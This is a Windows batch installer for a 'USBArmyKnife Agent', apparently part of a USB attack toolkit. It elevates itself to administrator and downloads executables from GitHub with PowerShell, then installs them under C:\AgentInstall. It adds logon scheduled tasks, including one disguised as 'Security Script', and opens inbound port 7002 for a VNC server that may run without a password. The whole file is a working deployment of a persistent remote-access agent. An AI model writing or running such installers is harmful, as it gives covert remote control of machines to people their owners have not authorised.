@echo off
setlocal EnableExtensions
title USBArmyKnife Agent Installer

REM ============================================================
REM  USBArmyKnife Agent Installer
REM  Downloads individual files from GitHub to the installer's
REM  directory, copies to C:\AgentInstall, sets up autostart/
REM  firewall, then cleans up.
REM ============================================================

set "DEST=C:\AgentInstall"
set "BASE=https://raw.githubusercontent.com/Korbi0312/USBArmyKnife-modded/master/tools/Installer"
set "DIR=%~dp0"

REM --- Elevation check ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Administrator privileges required...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo.
echo ========================================
echo   USBArmyKnife Agent Installer
echo ========================================
echo.

REM --- Password prompt ---
echo VNC Password (optional):
echo    Press Enter for no password.
echo.
set "VNCPASSWD="
set /p "VNCPASSWD=Password: "
if defined VNCPASSWD (
    echo    Password set.
) else (
    echo    No password.
)
echo.

REM --- 1. Stop running processes ---
echo [1/6] Stopping running processes...
taskkill /F /IM AgentLauncher.exe >nul 2>&1
taskkill /F /IM VncDirect.exe >nul 2>&1
timeout /t 1 /nobreak >nul

REM --- 2. Download files individually ---
echo [2/6] Downloading files from GitHub...

set "FAIL=0"

echo    [1/6] VncDirect.exe (~67MB, may take a moment)...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/VncDirect/VncDirect.exe' -OutFile '%DIR%VncDirect.exe' -UseBasicParsing -TimeoutSec 300" 2>nul
if not exist "%DIR%VncDirect.exe" (
    echo    [!] FAILED to download VncDirect.exe
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [2/6] AgentLauncher.exe...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%DIR%AgentLauncher.exe' -UseBasicParsing -TimeoutSec 300" 2>nul
if not exist "%DIR%AgentLauncher.exe" (
    echo    [!] FAILED to download AgentLauncher.exe
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [3/6] turbojpeg.dll...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/VncDirect/turbojpeg.dll' -OutFile '%DIR%turbojpeg.dll' -UseBasicParsing -TimeoutSec 60" 2>nul
if not exist "%DIR%turbojpeg.dll" (
    echo    [!] FAILED to download turbojpeg.dll
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [4/6] vcruntime140.dll...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/VncDirect/vcruntime140.dll' -OutFile '%DIR%vcruntime140.dll' -UseBasicParsing -TimeoutSec 60" 2>nul
if not exist "%DIR%vcruntime140.dll" (
    echo    [!] FAILED to download vcruntime140.dll
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [5/6] vnc-web.zip (noVNC web UI)...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/vnc-web.zip' -OutFile '%DIR%vnc-web.zip' -UseBasicParsing -TimeoutSec 60" 2>nul
if not exist "%DIR%vnc-web.zip" (
    echo    [!] FAILED to download vnc-web.zip
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [6/6] vnc-watchdog.bat...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/vnc-watchdog.bat' -OutFile '%DIR%vnc-watchdog.bat' -UseBasicParsing -TimeoutSec 30" 2>nul
if not exist "%DIR%vnc-watchdog.bat" (
    echo    [!] FAILED to download vnc-watchdog.bat
    set "FAIL=1"
) else (
    echo    [OK]
)

if "%FAIL%"=="1" (
    echo.
    echo    [!] One or more downloads failed. Check internet connection.
    echo    Retry or download files manually from:
    echo    %BASE%
    pause
    exit /b 1
)

echo    All downloads complete.

REM --- 3. Install files ---
echo [3/6] Installing to %DEST%...
if not exist "%DEST%" mkdir "%DEST%"
if not exist "%DEST%\VncDirect" mkdir "%DEST%\VncDirect"

copy /y "%DIR%VncDirect.exe" "%DEST%\VncDirect\VncDirect.exe" >nul
copy /y "%DIR%turbojpeg.dll" "%DEST%\VncDirect\turbojpeg.dll" >nul
copy /y "%DIR%vcruntime140.dll" "%DEST%\VncDirect\vcruntime140.dll" >nul
copy /y "%DIR%AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul
copy /y "%DIR%vnc-watchdog.bat" "%DEST%\vnc-watchdog.bat" >nul

echo    Extracting noVNC web UI...
powershell -NoProfile -Command "Expand-Archive -Path '%DIR%vnc-web.zip' -DestinationPath '%DEST%\VncDirect' -Force" 2>nul
if not exist "%DEST%\VncDirect\vnc\index.html" (
    echo    [!] FAILED to extract vnc-web.zip
    pause
    exit /b 1
)
echo    Files installed.

REM --- Save password ---
if not "%VNCPASSWD%"=="" (
    echo [+] Saving password...
    powershell -NoProfile -Command "$j = @{}; if (Test-Path '%DEST%\VncDirect\vnc-settings.json') { try { $raw = Get-Content '%DEST%\VncDirect\vnc-settings.json' -Raw; $obj = $raw | ConvertFrom-Json; foreach ($p in $obj.PSObject.Properties) { $j[$p.Name] = $p.Value } } catch {} }; $j['password'] = '%VNCPASSWD%'; $j | ConvertTo-Json | Set-Content '%DEST%\VncDirect\vnc-settings.json' -Encoding UTF8"
)

REM --- 4. Set up autostart ---
echo [4/6] Setting up autostart...

schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "USBArmyKnife Agent" /tr "\"%DEST%\AgentLauncher.exe\" vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "USBArmyKnife Agent" created.
)

schtasks /query /tn "Security Script" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "Security Script" /tr "\"%DEST%\AgentLauncher.exe\" vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "Security Script" created.
)

schtasks /query /tn "VNC Watchdog" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "VNC Watchdog" /tr "%DEST%\vnc-watchdog.bat" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "VNC Watchdog" created.
)

REM --- 5. Firewall rule ---
echo [5/6] Setting up firewall rule...
netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
if %errorlevel% neq 0 (
    netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul
    echo     Firewall rule created.
)

REM --- 6. Start services ---
echo [6/6] Starting Agent and VNC Server...
start "" "%DEST%\VncDirect\VncDirect.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%

REM Wait for port
set /a tries=0
:checkport
set /a tries+=1
powershell -NoProfile -Command "if (Get-NetTCPConnection -LocalPort 7002 -State Listen -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }" >nul 2>&1
if not %errorlevel% equ 0 (
    if %tries% lss 10 (
        timeout /t 1 /nobreak >nul
        goto checkport
    )
)
if %tries% lss 10 (
    echo     VNC Server listening on port 7002.
)

REM --- Done ---

echo.
echo ========================================
echo   Installation complete!
echo ========================================
echo.
echo PC Name:   %COMPUTERNAME%
echo IP Addresses:
for /f "usebackq tokens=2 delims=:" %%i in (`ipconfig ^| findstr /r "IPv4"`) do echo     %%i
echo.
if not "%VNCPASSWD%"=="" (
    echo VNC Password: %VNCPASSWD%
    echo.
)
echo VNC URL: http://localhost:7002/
echo.
echo Window closes in 10 seconds...
timeout /t 10 /nobreak >nul
endlocal
